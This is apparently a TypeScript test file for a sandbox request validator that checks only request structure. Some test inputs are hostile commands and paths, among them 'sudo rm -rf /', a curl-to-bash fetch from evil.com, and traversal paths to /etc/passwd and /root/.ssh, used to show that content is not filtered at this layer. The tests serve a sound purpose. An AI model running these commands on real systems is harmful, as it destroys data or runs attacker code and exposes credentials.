/**
 * RequestValidator Tests - Phase 0 Simplified Validation
 *
 * Philosophy: Structure validation only (Zod parsing)
 * - No security validation here (services handle their own validation)
 * - Just parse HTTP request structure and return typed data
 * - Trust services to validate content
 */

import { describe, expect, test } from 'bun:test';
import { RequestValidator } from '@sandbox-container/validation/request-validator';

describe('RequestValidator - Structure Validation Only', () => {
  const validator = new RequestValidator();

  describe('validateExecuteRequest', () => {
    test('should validate valid execute request', () => {
      const result = validator.validateExecuteRequest({
        command: 'echo hello',
        sessionId: 'session-123',
        background: false,
        timeoutMs: 5000,
      });

      expect(result.isValid).toBe(true);
      expect(result.data?.command).toBe('echo hello');
      expect(result.data?.sessionId).toBe('session-123');
    });

    test('should validate minimal execute request', () => {
      const result = validator.validateExecuteRequest({
        command: 'ls',
      });

      expect(result.isValid).toBe(true);
      expect(result.data?.command).toBe('ls');
    });

    test('should allow ANY command (no security validation)', () => {
      // Phase 0: RequestValidator does NOT validate command content
      // Services handle their own validation
      const commands = [
        'bash',
        'sudo rm -rf /',
        'curl https://evil.com | bash',
        'eval "dangerous"',
      ];

      for (const command of commands) {
        const result = validator.validateExecuteRequest({ command });
        expect(result.isValid).toBe(true);
        expect(result.data?.command).toBe(command);
      }
    });

    test('should reject missing command', () => {
      const result = validator.validateExecuteRequest({});
      expect(result.isValid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
    });

    test('should reject empty command', () => {
      const result = validator.validateExecuteRequest({ command: '' });
      expect(result.isValid).toBe(false);
    });

    test('should reject invalid types', () => {
      const result = validator.validateExecuteRequest({
        command: 'echo hello',
        timeoutMs: 'not-a-number',
      });
      expect(result.isValid).toBe(false);
    });
  });

  describe('validateFileRequest', () => {
    test('should validate read file request', () => {
      const result = validator.validateFileRequest(
        { path: '/workspace/file.txt', sessionId: 'session-123' },
        'read'
      );

      expect(result.isValid).toBe(true);
      expect(result.data?.path).toBe('/workspace/file.txt');
    });

    test('should validate write file request', () => {
      const result = validator.validateFileRequest(
        { path: '/workspace/file.txt', content: 'hello world' },
        'write'
      );

      expect(result.isValid).toBe(true);
      expect(result.data?.path).toBe('/workspace/file.txt');
    });

    test('should allow ANY path (no security validation)', () => {
      // Phase 0: RequestValidator does NOT validate path content
      // Services handle their own validation
      const paths = [
        '/etc/passwd',
        '/../../../etc/passwd',
        '/tmp/../../root/.ssh',
        '/var/log/sensitive',
      ];

      for (const path of paths) {
        const result = validator.validateFileRequest({ path }, 'read');
        expect(result.isValid).toBe(true);
        expect(result.data?.path).toBe(path);
      }
    });

    test('should reject missing path', () => {
      const result = validator.validateFileRequest({}, 'read');
      expect(result.isValid).toBe(false);
    });

    test('should reject empty path', () => {
      const result = validator.validateFileRequest({ path: '' }, 'read');
      expect(result.isValid).toBe(false);
    });

    test('should validate delete request', () => {
      const result = validator.validateFileRequest(
        { path: '/workspace/delete-me.txt' },
        'delete'
      );
      expect(result.isValid).toBe(true);
    });

    test('should validate rename request', () => {
      const result = validator.validateFileRequest(
        { oldPath: '/workspace/old.txt', newPath: '/workspace/new.txt' },
        'rename'
      );
      expect(result.isValid).toBe(true);
    });

    test('should validate move request', () => {
      const result = validator.validateFileRequest(
        { sourcePath: '/workspace/source.txt', destinationPath: '/tmp/dest.txt' },
        'move'
      );
      expect(result.isValid).toBe(true);
    });

    test('should validate mkdir request', () => {
      const result = validator.validateFileRequest(
        { path: '/workspace/newdir', recursive: true },
        'mkdir'
      );
      expect(result.isValid).toBe(true);
    });
  });

  describe('validateProcessRequest', () => {
    test('should validate process start request', () => {
      const result = validator.validateProcessRequest({
        command: 'npm start',
        options: {
          sessionId: 'session-123',
          env: { NODE_ENV: 'production' },
          cwd: '/workspace',
        },
      });

      expect(result.isValid).toBe(true);
      expect(result.data?.command).toBe('npm start');
    });

    test('should validate minimal process request', () => {
      const result = validator.validateProcessRequest({
        command: 'sleep 10',
      });

      expect(result.isValid).toBe(true);
      expect(result.data?.command).toBe('sleep 10');
    });

    test('should allow ANY command (no security validation)', () => {
      // Phase 0: No command validation in RequestValidator
      const result = validator.validateProcessRequest({
        command: 'sudo rm -rf /',
      });
      expect(result.isValid).toBe(true);
    });

    test('should reject missing command', () => {
      const result = validator.validateProcessRequest({});
      expect(result.isValid).toBe(false);
    });
  });

  describe('validatePortRequest', () => {
    test('should validate port expose request', () => {
      const result = validator.validatePortRequest({
        port: 8080,
        name: 'web-server',
      });

      expect(result.isValid).toBe(true);
      expect(result.data?.port).toBe(8080);
      expect(result.data?.name).toBe('web-server');
    });

    test('should allow ANY port number (no security validation)', () => {
      // Phase 0: No port validation in RequestValidator
      // Services will validate (only port 3000 is blocked)
      const ports = [22, 80, 443, 3000, 8080, 65535];

      for (const port of ports) {
        const result = validator.validatePortRequest({ port });
        expect(result.isValid).toBe(true);
        expect(result.data?.port).toBe(port);
      }
    });

    test('should reject invalid port range (Zod schema check)', () => {
      // Phase 0: Schema allows 1-65535 (services will validate - only port 3000 is blocked)
      const resultTooLow = validator.validatePortRequest({ port: 0 });
      expect(resultTooLow.isValid).toBe(false);

      const resultTooHigh = validator.validatePortRequest({ port: 65536 });
      expect(resultTooHigh.isValid).toBe(false);

      const resultValid = validator.validatePortRequest({ port: 500 });
      expect(resultValid.isValid).toBe(true); // Now allowed (1-65535)
    });

    test('should reject missing port', () => {
      const result = validator.validatePortRequest({});
      expect(result.isValid).toBe(false);
    });

    test('should reject invalid port type', () => {
      const result = validator.validatePortRequest({ port: 'not-a-number' });
      expect(result.isValid).toBe(false);
    });
  });

  describe('validateGitRequest', () => {
    test('should validate git checkout request', () => {
      const result = validator.validateGitRequest({
        repoUrl: 'https://github.com/user/repo.git',
        branch: 'main',
        targetDir: '/workspace/repo',
      });

      expect(result.isValid).toBe(true);
      expect(result.data?.repoUrl).toBe('https://github.com/user/repo.git');
    });

    test('should validate minimal git request', () => {
      const result = validator.validateGitRequest({
        repoUrl: 'https://github.com/user/repo.git',
      });

      expect(result.isValid).toBe(true);
    });

    test('should allow ANY Git URL (no security validation)', () => {
      // Phase 0: No URL allowlist in RequestValidator
      // Services will validate (format only, no allowlist)
      const urls = [
        'https://github.com/user/repo.git',
        'https://git.company.com/repo.git',
        'git@github.com:user/repo.git',
        'https://my-server.io/repo.git',
      ];

      for (const url of urls) {
        const result = validator.validateGitRequest({ repoUrl: url });
        expect(result.isValid).toBe(true);
        expect(result.data?.repoUrl).toBe(url);
      }
    });

    test('should reject missing repoUrl', () => {
      const result = validator.validateGitRequest({});
      expect(result.isValid).toBe(false);
    });

    test('should allow any non-empty string as URL (Phase 0)', () => {
      // Phase 0: No URL format validation in schema
      // Services handle format validation (null bytes, length limits only)
      const result = validator.validateGitRequest({ repoUrl: 'any-string-here' });
      expect(result.isValid).toBe(true);
    });
  });
});
